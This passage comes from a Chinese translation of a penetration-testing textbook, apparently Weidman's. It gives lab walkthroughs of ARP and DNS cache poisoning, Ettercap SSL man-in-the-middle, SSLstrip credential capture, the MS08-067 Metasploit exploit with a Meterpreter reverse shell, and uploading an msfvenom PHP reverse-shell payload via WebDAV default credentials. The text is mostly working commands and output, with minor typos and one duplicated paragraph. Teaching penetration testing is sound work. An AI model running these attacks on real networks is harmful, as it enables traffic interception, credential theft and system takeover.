  \       eth0\n192.168.20.10            ether   00:0c:29:05:26:4c   C           \
  \          eth0\n192.168.20.11            ether   80:49:71:14:97:2b   C        \
  \             eth0\n```\n\n依赖 ARP 进行地址寻址的问题在于，无法保证你收到的 IP 地址到 MAC 地址的答案是正确的。任何机器都可以响应针对\
  \ `192.168.20.11` 的 ARP 请求，即使该机器实际上位于 `192.168.20.12` 或其他 IP 地址上。尽管如此，目标机器都会接受该响应。\n\
  \n这就是简化的 ARP 缓存投毒。我们发送一系列 ARP 响应，告诉目标我们是网络上的另一台机器。因此，当目标发送发往该机器的流量时，它将直接把数据包发送给我们，由我们的流量嗅探器捕获，如图图\
  \ 7-7 所示。\n\n回顾第 7 章，我们从 Ubuntu 目标向 Windows XP 目标启动了一个 FTP 连接，但通过该连接的流量并没有被我们 Kali\
  \ 系统上的 Wireshark 捕获。使用 ARP 缓存投毒攻击，我们可以欺骗这两个系统将它们的流量发送到我们的 Kali 机器，从而在 Wireshark\
  \ 中捕获。\n\n![ARP cache poisoning redirects traffic through Kali.](img/httpatomoreillycomsourcenostarchimages2030368.png.jpg)图\
  \ 7-7. ARP 缓存投毒通过 Kali 重定向流量。\n\n### IP 转发 (IP Forwarding)\n\n但在我们欺骗 Linux 目标将 FTP\
  \ 服务器的凭据发送给我们之前，我们需要开启 IP 转发，告诉我们的 Kali 机器将它收到的任何多余数据包转发到正确的目的地。如果没有 IP 转发，我们将在网络上导致拒绝服务（DoS）状态，使得合法客户端无法访问服务。例如，如果我们不在不开启\
  \ IP 转发的情况下使用 ARP 缓存投毒来重定向从 Linux 目标发往 Windows XP 目标的流量，那么 Windows XP 机器上的 FTP 服务器将永远无法接收来自\
  \ Linux 机器的数据包，反之亦然。\n\nKali 上的 IP 转发设置位于 `/proc/sys/net/ipv4/ip_forward`。我们需要将此值设置为\
  \ `1`。\n\n```\nroot@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n在开始 ARP\
  \ 缓存投毒之前，注意 Linux 目标 ARP 缓存中 Windows XP 目标（`192.168.20.10`）的条目。\n\n```\nroot@kali:~#\
  \ arp\nAddress                  HWtype  HWaddress           Flags Mask         \
  \   Iface\n192.168.20.1             ether   00:23:69:f5:b4:29   C              \
  \       eth0\n192.168.20.10            ether   00:0c:29:05:26:4c   C           \
  \          eth0\n192.168.20.11            ether   80:49:71:14:97:2b   C        \
  \             eth0\n```\n\n### 使用 Arpsof 进行 ARP 缓存投毒\n\n用于 ARP 投毒的一个易用工具是 `arpsof`。要使用\
  \ `arpsof`，我们告诉它哪种接口、ARP 缓存目标以及我们想要伪装的 IP 地址。（如果你漏掉目标，将投毒整个网络）。在示例中，为了欺骗 Linux 目标认为我们是\
  \ Windows XP 机器，我们将 `-i` 设置为 `eth0` 以指定接口，将 `-t` 设置为 `192.168.20.10` 以指定目标。\n\n\
  ```\nroot@kali:~# arpsof -i eth0 -t 192.168.20.10 192.168.20.1\n```\n\n`arpsof`\
  \ 立即开始向 Linux 目标发送 ARP 响应，告知 Windows XP 机器位于 Kali 机器。（ARP 缓存条目在不同实现之间的更新时间不同，但等待一分钟是一个安全的长度。）\n\
  \n为了捕获对话的另一端，我们需要欺骗 Windows XP 机器将发往 Linux 目标的流量发送到 Kali 机器。启动另一个 `arpsof` 实例，这次将目标设置为\
  \ Windows XP 机器，并将接收者设置为 Linux 机器。\n\n```\nroot@kali:~# arpsof -i eth0 -t 192.168.20.11\
  \ 192.168.20.1\n```\n\n一旦开始 ARP 缓存投毒，检查你 Linux 目标的 ARP 缓存。注意与 Windows XP 目标关联的 MAC\
  \ 地址已更改为 `70:56:81:b2:f0:53`。Linux 目标会将所有发往 Windows XP 目标的流量发送到 Kali 机器，我们可以在那里通过\
  \ Wireshark 捕获它。\n\n```\ngeorgia@ubuntu:~$ arp -a\n? (192.168.20.1) at 00:23:69:f5:b4:29\
  \ [ether] on eth0\n? (192.168.20.10) at 70:56:81:b2:f0:53 [ether] on eth0\n```\n\
  \n现在从 Linux 目标使用另一个账户登录 Windows XP 目标的 FTP 服务器（参见示例 7-3）。（如果你遵循了我在第 1 章中的指令，凭据 `georgia:password`\
  \ 将有效。如果你设置了其他凭据，请使用那些。）\n\n示例 7-3. 从 Ubuntu 目标登录 Windows XP 的 FTP 服务器\n\n\n\n\n\
  \n由于我们开启了 IP 转发，对于我们的用户来说，一切看起来运行正常。回到 Wireshark，我们看到这次能够捕获 FTP 流量并读取明文登录凭据。图 7-8\
  \ 所示 Wireshark 输出证实了我们的 `Kali` 机器正在转发两个目标之间的 FTP 流量。在每个 FTP 数据包之后，都有一个重传包。\n\n![Wireshark\
  \ captures the login information.](img/httpatomoreillycomsourcenostarchimages2030370.png.jpg)图\
  \ 7-8. Wireshark 捕获登录信息。\n\n### 使用 ARP 缓存中毒伪装默认网关\n\n我们还可以使用 ARP 缓存中毒来伪装网络上的默认网关，并访问进入和离开网络的流量，包括发往互联网的流量。停止你运行的\
  \ `Arpspoof` 进程，尝试通过伪装默认网关，欺骗 Linux 目标将所有流量通过 `Kali` 机器路由到网关，如下所示。\n\n```\nroot@kali:~#\
  \ arpspoof -i eth0 -t 192.168.20.11 192.168.20.1\n```\n\n```\nroot@kali:~# arpspoof\
  \ -i eth0 -t 192.168.20.1 192.168.20.11\n```\n\n如果我们从 Linux 目标开始浏览互联网，我们应该看到 Wireshark\
  \ 捕获了 HTTP 数据包。即使敏感信息通过 `HTTPS` 加密，我们仍然能够看到用户去向哪里以及通过 HTTP 发送的任何其他信息。例如，如果我们运行一个\
  \ Google 查询，查询的明文将在 Wireshark 中被捕获，如图 7-9 所示。\n\n### 注意事项\n\n如果你使用 ARP 缓存中毒欺骗一个大型网络认为你的渗透机器是默认网关，你可能会在无意中引起网络问题。网络中的所有流量通过一台笔记本电脑（更糟糕的是，一台虚拟机），在某些情况下可能会导致速度慢到拒绝服务的程度。\n\
  \n![Query captured in Wireshark](img/httpatomoreillycomsourcenostarchimages2030372.png.jpg)图\
  \ 7-9. Wireshark 捕获查询。\n\n## DNS 缓存中毒\n\n除了 ARP 缓存中毒外，我们还可以污染域名服务（DNS）缓存条目（域名到 IP\
  \ 地址的映射），将旨在访问另一个网站的流量路由到我们控制的站点。就像 ARP 解析 IP 地址到 MAC 地址以正确路由流量一样，DNS 将 `[www.gmail.com](http://www.gmail.com)`\
  \ 等域名映射（或解析）到 IP 地址。\n\n要访问互联网或本地网络上的另一个系统，我们的机器需要知道连接的 IP 地址。如果我们想访问网页邮箱账户，记住 `[www.gmail.com](http://www.gmail.com)`\
  \ URL 是很容易的，但记住一组 IP 地址就很困难，这些地址可能经常更改。DNS 解析将人类可读的域名转换为 IP 地址。例如，我们可以使用 `Nslookup`\
  \ 工具将 `[www.gmail.com](http://www.gmail.com)` 翻译为 IP 地址，如示例 7-4 所示。\n\n示例 7-4. Nslookup\
  \ DNS 解析。\n\n```\nroot@kali~# nslookup www.gmail.com\nServer: 75.75.75.75\nAddress:\
  \ 75.75.75.75#53\n\nNon-authoritative answer:\nwww.gmail.com canonical name = mail.google.com.\n\
  mail.google.com canonical name = googlemail.l.google.com.\nName:     googlemail.l.google.com\n\
  Address: 173.194.37.85\nName:     googlemail.l.google.com\nAddress: 173.194.37.86\n\
  ```\n\n如你所示，`Nslookup` 将 `[www.gmail.com](http://www.gmail.com)` 翻译多个 IP 地址，包括 `173.194.37.85`\
  \ 和 `173.194.37.86`，我们都可以用它们到达 Gmail。要执行 DNS 解析(图 7-10），我们的系统查询本地 DNS 服务器获取关于特定域名的信息，例如\
  \ `[www.gmail.com](http://www.gmail.com)`。如果 DNS 服务器有该地址的缓存条目，它会给我们的系统正确的 IP 地址。如果没有，它会联系互联网上的其他\
  \ DNS 服务器寻找正确的信息。\n\n当返回正确的 IP 地址时，DNS 服务器向我们的机器写回 `[www.gmail.com](http://www.gmail.com)`\
  \ 的正确 IP 解析结果，然后我们的系统将 `[www.gmail.com](http://www.gmail.com)` 转换为 `173.194.37.85`。\n\
  \n### 入门指南\n\n在使用 DNS 缓存中毒之前，我们需要创建一个文件，指定我们想要欺骗的名称。例如，通过在一个名为 `hosts` 的新文件中添加 `192.168.20.9`，告诉\
  \ `[www.gmail.com](http://www.gmail.com)` 该 IP 地址是我们的 Kali 机器。\n\n```\nroot@kali:~#\
  \ cat > hosts\n192.168.20.9  www.gmail.com\n```\n\n为了演示此攻击，设置一个重定向流量的网站。`Kali` 中的\
  \ Apache 服务器默认会向任何访问它的用户提供“It Works”页面。我们可以更改 `/var/www` 文件夹下 `index.html` 文件的内容，但默认的“It\
  \ Works”文本对于我们的目的已经足够了。\n\n```\nroot@kali:~# service apache2 start\n```\n\n现在我们可以启动\
  \ `dnsspoof`。我们指定要使用的网络接口，并将 `dnsspoof` 指向我们刚刚创建的文件。\n\n```\nroot@kali:~# dnsspoof\
  \ -i eth0 -f hosts\n```\n\n一旦 `dnsspoof` 运行，当从我们的 Linux 目标运行 `nslookup` 命令时，返回的\
  \ IP 地址应该是我们 Kali 机器的地址，如示例 7-5 所示。\n\n```\ngeorgia@ubuntu:~$ nslookup www.gmail.com\n\
  Server: 75.75.75.75\nAddress: 75.75.75.75#53\n\nNon-authoritative answer:\nName:\
  \     www.gmail.com\nAddress: 192.168.20.9\n```\n\n如果你使用 ARP 缓存中毒欺骗一个大型网络认为你的渗透机器是默认网关，你可能会在无意中引起网络问题。网络中的所有流量通过一台笔记本电脑（更糟糕的是，一台虚拟机），在某些情况下可能会导致速度慢到拒绝服务的程度。\n\
  \n\n\n\n\n到目前为止，我们已经能够拦截加密流量，但一直无法从加密连接中获取任何敏感信息。对于接下来的攻击，我们将依靠用户愿意点击忽略 SSL 证书警告来执行中间人攻击攻击，并从安全套接层（SSL）连接中获取明文。SSL\
  \ 连接通过对流量进行加密来防止其被窃听者读取。\n\n### SSL 基础\n\n`SSL` 的目标是提供合理的保证，确保在用户浏览器和服务器之间传输的任何敏感信息（如凭据或信用卡号）都是安全的——即无法被中途的恶意实体读取。为了证明连接是安全的，`SSL`\
  \ 使用证书。当你访问启用 SSL 的站点时，你的浏览器会要求站点通过其 SSL 证书来标识身份。站点展示其证书，你的浏览器对其进行验证。如果浏览器接受该证书，它会通知服务器，服务器返回一个数字签名的确认，随后开始\
  \ SSL 保护的通信。\n\n一个 `SSL` 证书包含一对加密密钥以及身份识别信息，例如域名和拥有该网站的公司名称。服务器的 SSL 证书通常由证书机构（`CA`）背书，例如\
  \ `VeriSign` 或 `Thawte`。浏览器预装了受信任的 `CA` 列表，如果服务器的 SSL 证书由受信任的 `CA` 背书，浏览器就可以建立安全连接。如果证书不受信任，用户将看到一个警告，内容大致为：“连接可能是安全的，但也可能不是。请自担风险。”\n\
  \n### 使用 Ettercap 进行 SSL 中间人攻击\n\n在我们的 ARP 缓存中毒攻击中，我们对 Windows XP 和 Ubuntu 目标之间（以及\
  \ Ubuntu 目标和互联网之间）的流量进行了中间人。这些系统仍然相互通信，但我们的 Kali 系统能够捕获流量。我们可以采取相同的方法攻击 SSL 流量。通过将发往\
  \ [www.facebook.com](http://www.facebook.com) 的流量重定向到我们的 Kali 系统，我们可以破坏安全的 SSL 连接并拦截敏感信息。\n\
  \n在本示例中，我们将使用 `Ettercap`，这是一个多功能的中间人攻击套件，除了 SSL 攻击外，它还可以完成我们之前使用 `Arpspoof` 和 `Dnsspoof`\
  \ 执行的所有攻击。在启动 `Ettercap` 之前，关闭所有其他欺骗工具。配置说明请参阅 Ettercap。\n\n`Ettercap` 有多个接口，但在本示例中我们将\
  \ `-T` 选项用于文本界面。使用 `-M` 选项配合 `arp:remote /gateway /target/` 在默认网关和 Linux 目标之间建立\
  \ ARP 缓存中毒攻击，如下所示。实际的操作与我们之前使用 `Arpspoof` 的练习相同。\n\n```\nroot@kali:~# ettercap -Ti\
  \ eth0 -M arp:remote /192.168.20.1/ /192.168.20.11/\n```\n\n当 `Ettercap` 运行时，我们只需等待用户开始与基于\
  \ SSL 的 Web 服务器交互。切换到你的 Linux 目标，尝试使用 SSL 登录网站。你应该看到类似于图 7-12 的证书警告。由于由于中间人攻击，SSL\
  \ 会话的安全性无法通过验证。`Ettercap` 展示的证书对于 [www.facebook.com](http://www.facebook.com) 是无效的，因此信任被破坏了，如图\
  \ 7-13 所示。\n\n但安全警告并不能阻止所有用户。如果我们点击警告并输入凭据，`Ettercap` 将在将其转发到服务器之前以明文形式捕获它们，如下所示：\n\
  \n```\nHTTP : 31.13.74.23:443 -> USER: georgia  PASS: password  INFO: https://www.facebook.com/\n\
  ```\n\n![无法验证 Facebook。](img/httpatomoreillycomsourcenostarchimages2030378.png.jpg)图\
  \ 7-12.无法验证 Facebook。![SSL 中间人攻击](img/httpatomoreillycomsourcenostarchimages2030380.png.jpg)图\
  \ 7-13.SSL 中间人攻击\n\n### SSL 剥离 (SSL Stripping)\n\n当然，SSL 中间人攻击的麻烦在于用户必须点击忽略 SSL\
  \ 证书警告。根据浏览的不同，这可能是一个复杂的过程，对于用户来说很难忽略甚至无法忽略。大多数读者可能都想过自己在点击安全警告并继续进入页面，尽管这违背了直觉。（例如：我们默认的\
  \ Nessus 安装使用 Tenable 的自签名证书，当你访问 Web 界面时会抛出证书错误。如果你选择跟随该示例，你很可能决定点击忽略警告。）\n\n很难说证书警告在阻止用户访问没有有效证书的\
  \ HTTPS 站点方面有多大成效之明。我曾运行过采用自签名 SSL 证书的社会工程测试，其成功率明显低于使用有效证书或不使用 HTTPS 的情况。虽然某些用户确实点击了忽略并访问了网站，但更复杂的攻击允许我们以明文形式捕获信息，而不会触发那些关于\
  \ SSL 连接被攻破的明显警告。\n\n通过 SSL 剥离，我们在 HTTP 连接被重定向到 SSL 之前对其进行中间人攻击，并在将数据送到 Web 服务器之前添加\
  \ SSL 功能。当 Web 服务器响应时，SSL 剥离再次拦截流量并在将数据包发送客户端之前移除 HTTPS 标签。这种技术在图 7-14 所示。\n\n![SSL\
  \ 剥离攻击](img/httpatomoreillycomsourcenostarchimages2030382.png.jpg)图 7-14.SSL 剥离攻击\n\
  \n`SSLstrip` 的作者 Moxie Marlinspike 将证书警告称为*负面反馈*，而与会话有效的*正反馈*形成对比，例如在浏览器地址栏中看到 HTTPS。对于攻击的成功来说，避免这种负面反馈比包含正反馈重要得多，因为用户注意到\
  \ URL 显示为 HTTP 而不是 HTTPS 的概率，远小于他们注意到一个必须主动点击的巨大证书警告的概率。SSL 剥离通过再次对连接进行中间人攻击来避免证书警告。\n\
  \n用户通常通过点击链接或 HTTP 302 重定向遇到 HTTPS。大多数用户不会在浏览器中输入 [`www.facebook.com`](https://www.facebook.com)\
  \ 甚至 [`www.facebook.com`](http://www.facebook.com)；他们输入 [www.facebook.com](http://www.facebook.com)\
  \ 有时只是 facebook.com。这就是这种攻击可能的原因。`SSLstrip` 添加了 HTTPS 本，因此 Facebook 和 Kali 之间的 SSL\
  \ 连接是有效的。`SSLstrip` 只是将连接转回 HTTP 以发送给原始请求者。没有证书警告。\n\n### 使用 SSLstrip\n\n`SSLstrip`\
  \ 工具实现了 SSL 剥离。在我们启动它之前，需要设置 `iptables` 规则，将发往 80 端口的流量通过 `SSLstrip`。我们将在 8080 端口运行\
  \ `SSLstrip`，如下所示，然后重启 `Arpspoof` 并欺骗默认网关。（有关指令，请回到使用 ARP 缓存中毒伪装默认网关）。\n\n```\n\
  root@kali:# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT\
  \ --to-port 8080\n```\n\n现在启动 `SSLstrip`，并使用 `-l` 标志告诉它在 8080 端口上监听。\n\n```\nroot@kali:#\
  \ sslstrip -l 8080\n```\n\n\n\n\n接下来，从你的 Linux 目标访问一个使用 SSL 的网站（尝试任何需要登录凭据的站点），例如图\
  \ 7-15 所示的 Twitter 登录页面。你可以看到，地址栏中的 HTTPS 已替换为 HTTP。\n\n当你登录时，`SSLstrip` 将报告明文报告凭据。（不，我的\
  \ Twitter 密码并不真的是“密码”。。）\n\n这种攻击比直接的 SSL 中间人攻击更复杂。我们能够避免证书警告，是因为服务器是与 `SSLstrip`\
  \ 完成了 SSL 连接，而不是与浏览器。\n\n```\n2015-12-28 19:16:35,323 SECURE POST Data (twitter.com):\n\
  session%5Busername_or_email%5D=georgiaweidman&session%5Bpassword%5D=password&scribe_log=&redirect_after_login=%2F&authenticity_token=a26a0faf67c2e11e6738053c81beb4b8ffa45c6a\n\
  ```\n\n如你所示，`SSLstrip` 以明文报告了输入的凭据 `georgiaweidman: password`。\n\n![运行 SSLstrip\
  \ 的 Twitter 登录页面](img/httpatomoreillycomsourcenostarchimages2030384.png.jpg)图 7-15.\
  \ 运行 SSLstrip 的 Twitter 登录页面\n\n## 总结\n\n在本章中，我们通过操纵网络流量创建了一些有趣的结果。通过使用各种工具和技术，我们能够拦截在交换式网络中本不该看到的流量。我们使用\
  \ ARP 缓存投毒将交换式网络中的流量重定向到我们的 Kali 系统，并使用 DNS 缓存投毒将用户重定向到我们的 Web 服务器。我们使用 `Ettercap`\
  \ 自动化 SSL 中间人攻击，并（假设用户点击了警告）获取明文敏感信息。最后，我们通过使用 SSL 剥离避免了无效证书警告，使攻击更加复杂。\n\n从本地网络捕获流量可以为渗透测试提供有用信息。例如，我们捕获了\
  \ FTP 服务器的有效凭据用于漏洞利用。\n\n说到漏洞利用，让我们开始吧。\n\n# 第三部分 攻击\n\n## 第 8 章 漏洞利用\n\n在完成所有准备工作后，我们终于进入了有趣的阶段：漏洞利用。在渗透测试的漏洞利用阶段，我们针对发现的漏洞运行利用以获取目标系统的访问权限。某些漏洞（例如使用默认密码）很容易利用，几乎感觉不像是在利用。另一些则要复杂得多。\n\
  \n在本章中，我们将利用第 6 章中识别出的漏洞，在目标机器上建立脚点。现在我们已经有了更多关于该漏洞的背景知识，我们将回到第 4 章中的老朋友 MS08-067。我们还将使用\
  \ Metasploit 模块利用 SLMail POP3 服务器中的一个问题。此外，我们将利用之前的渗透成果，并绕过 Linux 目标上 FTP 服务器的登录。我们将利用\
  \ Linux 目标上 TikiWiki 安装中的一个漏洞，以及 Windows 目标上 XAMPP 安装的几个默认密码问题。我们还将利用一个可读可写的 NFS\
  \ 共享来获取 SSH 密钥的控制权，并在不知道密码的情况下作为合法用户登录。我们将与非端口上的脆弱 Web 服务器进行交互，利用目录遍历漏洞下载系统文件。若要回顾我们如何发现用于漏洞利用的每一个问题，请参阅第\
  \ 6 章。\n\n## 回顾 MS08-067\n\n我们从第 6 章中得知，Windows XP 目标上的 SMB 服务器缺少 MS08-067 补丁。MS08-067\
  \ 漏洞以利用成功而闻名，相应的 Metasploit 模块被评为 `great`。我们在第 4 章中将该漏洞作为示例，但之前章节中获得的知识为我们提供了坚实的证据，证明该利用将导致攻破。\n\
  \n当我们在第 4 章中查看 `windows/smb/ms08_067_netapi` 模块的选项时，我们看到了常见的 `RHOST` 和 `RPORT` 以及\
  \ `SMBPIPE`，后者允许我们设置利用程序将使用的管道。默认是浏览器管道，但我们也可以使用 `SRVSRC`。在第 4 章中，我们运行了 Metasploit\
  \ 模块 `scanner/smb/pipe_auditor` 来枚举监听的 SMB 管道，发现只有浏览器管道可用。因此，我们知道默认 `SMBPIPE` 选项\
  \ `BROWSER` 是唯一有效的。\n\n### Metasploit Payloads\n\n正如我们在第 4 章中讨论过的样，payload（负载）允许我们让被利用系统代表我们执行操作。虽然许多\
  \ payload 要么是 `bind shells`（在目标机器的本地端口上监听），要么是 `reverse shells`（回连攻击系统上的监听器），但其他\
  \ payload 会执行特定功能。例如，如果你在 iPhone 上运行负载 `osx/armle/vibrate`，手机将会振动。还有用于添加新用户账户的负载：Linux\
  \ 系统的 `linux/x86/adduser` 和 Windows 的 `windows/adduser`。我们可以使用 `windows/download_exec_https`\
  \ 下载并执行文件，或使用 `windows/exec` 执行命令。我们甚至可以使用语音 API 通过 `windows/speak_pwned` 让目标说“Pwned”。\n\
  \n记得我们可以在 `Msfconsole` 根目录下输入 `show payloads` 来看到所有可用的 payload。在告诉 Metasploit 使用\
  \ `windows/smb/ms08_067_netapi` 模块后输入此命令，你就可以看到与 MS08-067 利用兼容的 payload。\n\n在第 4\
  \ 章中，我们使用了 `windows/shell_reverse_tcp`，但通过列表，我们也看到了一个名为 `windows/shell/reverse_tcp`\
  \ 的 payload。\n\n```\nwindows/shell/reverse_tcp    normal  Windows Command Shell,\
  \ Reverse TCP Stager\nwindows/shell_reverse_tcp    normal  Windows Command Shell,\
  \ Reverse TCP Inline\n```\n\n这两个 payload 都使用反向连接（在第 4 章中讨论过）创建 Windows 命令 shell。被利用的机器将按照\
  \ payload 选项指定的 IP 地址和端口连接回我们的 Kali 。`windows/smb/ms08_067_netapi` 列出的任何 payload\
  \ 都可以工作，但在不同的渗透场景下，你可能需要发挥创意。\n\n### Staged Payloads\n\n`windows/shell/reverse_tcp`\
  \ payload 是 `staged`（分阶段的）。如果我们在配合 `windows/smb/ms08_067_netapi` 时使用它，发送到 SMB 服务器以控制目标机器的字符串并不包含创建反向\
  \ shell 的所有指令。相反，它包含一个 `stager payload`，仅包含足够连接回攻击机器并向 Metasploit 询问下一步操作指令的信息。当我们启动利用程序时，Metasploit\
  \ 会为 `windows/shell/reverse_tcp` payload 设置一个处理器（handler），以捕获传入的反向连接并提供 payload\
  \ 的其余部分——在本例中是反向 shell——然后执行完整的 payload，Metasploit 的处理器会捕获该反向 shell。payload 可用的内存空间可能有限，且某些高级的\
  \ Metasploit payload 会占用大量空间。分阶段 payload 允许我们在不需要占用大量内存的情况下使用复杂的 payload。\n\n###\
  \ Inline Payloads\n\n\n\n\n\n`windows/shell_reverse_tcp` 负载是一个内联（inline）或单阶段（single）负载。其利用字符串包含了将一个反反向\
  \ shell 推送回攻击者机器所需的所有代码。虽然内联负载占用的空间比阶段性（staged）负载大，但它们更稳定、更一致，因为所有指令都包含在原始利用字符串中。你可以通过模块名称的语法来区分内联和阶段性负载。例如，`windows/shell/reverse_tcp`\
  \ 或 `windows/meterpreter/bind_tcp` 是阶段性的，而 `windows/shell_reverse_tcp` 是内联的。\n\n\
  ## Meterpreter\n\nMeterpreter 是为 Metasploit 项目编写的自定义负载。它通过名为 `reflective dll injection`（反射\
  \ DLL 注入）的技术直接加载到被利用进程的内存中。因此，Meterpreter 完全驻内存，不会向磁盘写入任何内容。它在主机进程的内存中运行，因此不需要启动可能被入侵防御或入侵检测系统（IPS/IDS）注意的新进程。Meterpreter\
  \ 还使用传输层安全（TLS）加密进行其与 Metasploit 之间的通信。你可以将 Meterpreter 视为一种 shell 及其扩展。它具有我们可以使用的额外有用命令，例如\
  \ `hashdump`，它允许我们获取本地 Windows 密码哈希值。（我们在学习第 13 章 中的后渗透时将查看许多 Meterpreter 命令。）\n\
  \n我们在第 4 章中看到，Metasploit 针对 `windows/smb/ms08_067_netapi` 的默认负载是 `windows/meterpreter/reverse_tcp`。这次让我们在\
  \ MS08-067 利用中使用 `windows/meterpreter/reverse_tcp` 负载。我们的负载选项对我们目前为止使用的其他反向负载来说应该很熟悉。让我们设置负载并运行利用程序，如示例\
  \ 8-1 所示。\n\n### 示例 8-1. 使用 Meterpreter 负载利用 MS08-067\n\n```\nmsf  exploit(ms08_067_netapi)\
  \ > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\n\
  msf  exploit(ms08_067_netapi) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\n\
  msf  exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n\
  [*] Automatically detecting the target...\n[*] Fingerprint: Windows XP - Service\
  \ Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n\
  [*] Attempting to trigger the vulnerability...\n[*] Sending Stage to 192.168.20.10...\n\
  [*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4312) at 2015-01-12\
  \ 00:11:58 -0500\n```\n\n如输出所示，运行此利用程序应该打开一个 Meterpreter 会话，我们可以将其用于后渗透。\n\n## 利用\
  \ WebDAV 默认凭据\n\n在第 6 章中，我们发现 Windows XP 目标上的 XAMPP 安装对用于上传文件到 Web 服务器的 WebDAV 文件夹使用了默认登录凭据。此问题允许我们使用\
  \ `Cadaver`（WebDAV 的命令行客户端）向服务器上传我们自己的页面，我们在第 6 章中用它验证了该漏洞。让我们创建一个简单的测试文件进行上传：\n\
  \n```\nroot@kali:~# cat test.txt\ntest\n```\n\n现在使用凭据 `wampp:xampp` 配合 `Cadaver`\
  \ 对 WebDAV 进身份验证。\n\n```\nroot@kali:~# cadaver http://192.168.20.10/webdav\nAuthentication\
  \ required for XAMPP with WebDAV on server `192.168.20.10`:\nUsername: wampp\nPassword:\n\
  dav:/webdav/>\n```\n\n最后，使用 WebDAV 的 `put` 命令将我们的 `test.txt` 文件上传到 Web 服务器。\n\n\
  ```\ndav:/webdav/> put test.txt\nUploading test.txt to `/webdav/test.txt':\nProgress:\
  \ [=============================>] 100.0% of 5 bytes succeeded.\ndav:/webdav/>\n\
  ```\n\n如果你浏览到 `/webdav/test.txt`，你应该看到我们已成功将文本文件上传到网站，如图 8-1 所示。\n\n![A file uploaded\
  \ with WebDAV](img/httpatomoreillycomsourcenostarchimages2030386.png.jpg)图 8-1.\
  \ 使用 WebDAV 上传的文件\n\n### 在目标 Web 服务器上运行脚本\n\n文本文件对我们来说并不用；如果我们能上传脚本并在 Web 服务器上执行它，会更好，这允许我们在底层系统的\
  \ Apache Web 服务器上运行命令。如果 Apache 作为系统服务安装的，它将具有系统级权限，我们可以利用它获得对目标的最大控制权。如果不是，Apache\
  \ 将以启动它的用户的权限运行。无论哪，只要通过在 Web 服务器上丢一个文件，你就应该对底层系统获得相当大的控制权。\n\n让我们先确认我们的 WebDAV\
  \ 用户是否允许向服务器上传脚本。因为我们在第 6 章中在性 Web 服务器上发现了 phpMyAdmin 软件，我们知道 XAMPP 软件包含了 PHP。如果我们上传并执行\
  \ PHP 文件，我们应该能够使用 PHP 在系统上运行命令。\n\n```\ndav:/webdav/> put test.php\nUploading test.php\
  \ to `/webdav/test.php':\nProgress: [=============================>] 100.0% of 5\
  \ bytes succeeded.\ndav:/webdav/>\n```\n\n### 注意\n\n某些 WebDAV 服务器允许上传文本文件，但阻止像 .asp\
  \ 或 .php 这样的脚本。幸运的是，这里并非如此，我们成功上传了 test.php。\n\n### 上传 Msfvenom 负载\n\n除了我们可以创建用于执行任务的任何\
  \ PHP 脚本外，我们还可以使用 `Msfvenom` 生成独立的 Metasploit 负载并上传。我们在第 4 章中简要使用过 `Msfvenom`，但要熟悉语法可以输入\
  \ `msfvenom -h` 查看帮助。当你准备好时，使用 `-l` 选项列出所有可用负载，如示例 8-2 所示。\n\n### 示例 8-2. PHP 负载\n\
  \n```\nroot@kali:~# msfvenom -l payloads\n\n    php/bind_perl❶               监听连接并产生命令\n\
  \                                    通过 perl 持续 shell\n    php/bind_perl_ipv6  \
  \           监听连接并产生命令\n                                    通过 perl 在 IPv6 上持续 shell\n\
  \    php/bind_php                  监听连接并产生命令\n                                 \
  \   通过 php 持续 shell\n    php/bind_php_ipv6             监听连接并产生命令\n             \
  \                       通过 php 在 IPv6 上持续 shell\n    php/download_exec❷        \
  \   从 HTTP URL 下载 EXE 并执行它\n    php/exec                      执行单个系统命令\n    php/meterpreter/bind_tcp❸\
  \    监听 IPv6 上的，在 PHP 中运行\n                                    meterpreter server\n\
  \    php/meterpreter/reverse_tcp   反向 PHP 连接阶段器，并对禁用函数\n                       \
  \             检查，在 PHP 中运行 meterpreter server\n    php/meterpreter_reverse_tcp \
  \  连接回攻击者并产生\n                                    Meterpreter server (PHP)\n   \
  \ php/reverse_perl              通过 perl 创建交互式 shell\n    php/reverse_php       \
  \        反向 PHP 连接 shell，并对禁用函数\n                                    检查\n    php/shell_findsock\n\
  ```\n\nMsfvenom 给了我们几个选项：我们可以在系统上下载并执行文件 ❷，创建一个 shell ❶，甚至使用 Meterpreter ❸。任何这些负载都能让我们获得系统的控制权，但让我们使用\
  \ `php/meterpreter/reverse_tcp`。在我们指定负载后，可以使用 `-o` 找到需要与它一起使用的选项，如下所示。\n\n\n\n\n\
  \n```\nroot@kali:~# msfvenom -p php/meterpreter/reverse_tcp -o\n[*] Options for\
  \ payload/php/meterpreter/reverse_tcp\n\n--snip--\n    Name   Current Setting  Required\
  \  Description\n    ----   ---------------  --------  -----------\n    LHOST   \
  \                yes       The listen address\n    LPORT  4444             yes \
  \      The listen port\n```\n\n如你所示，我们需要设置 `LHOST` 来告诉 payload 回连到哪个 IP 地址，我们也可以更改\
  \ `LPORT` 选项。由于此 payload 已经是 PHP 格式，我们可以在设置选项后使用 `-f` 选项以原始格式输出，然后将原始 PHP 代码重定向到扩展名为\
  \ `.php` 的文件中并上传到服务器，如下：\n\n```\nroot@kali:~# msfvenom -p php/meterpreter/reverse_tcp\
  \ LHOST=192.168.20.9 LPORT=2323 -f raw > meterpreter.php\n```\n\n现在我们使用 WebDAV 上传该文件。\n\
  \n```\ndav:/webdav/> put meterpreter.php\nUploading meterpreter.php to `/webdav/meterpreter.php':\n\
  Progress: [=============================>] 100.0% of 1317 bytes succeeded.\n```\n\
  \n正如第 4 章所示，在执行脚本之前，我们需要在 Msfconsole 中设置 handler 来拦截 payload（参见示例 8-3\")）。\n\n####\
  \ 示例 8-3. 设置 payload handler\n\n```\nmsf > use multi/handler\nmsf  exploit(handler)\
  \ > set payload php/meterpreter/reverse_tcp❶\npayload => php/meterpreter/reverse_tcp\n\
  msf  exploit(handler) > set LHOST 192.168.20.9❷\nlhost => 192.168.20.9\nmsf  exploit(handler)\
  \ > set LPORT 2323❸\nlport => 2323\nmsf  exploit(handler) > exploit\n[*] Started\
  \ reverse handler on 192.168.20.9:2323\n[*] Starting the payload handler...\n```\n\
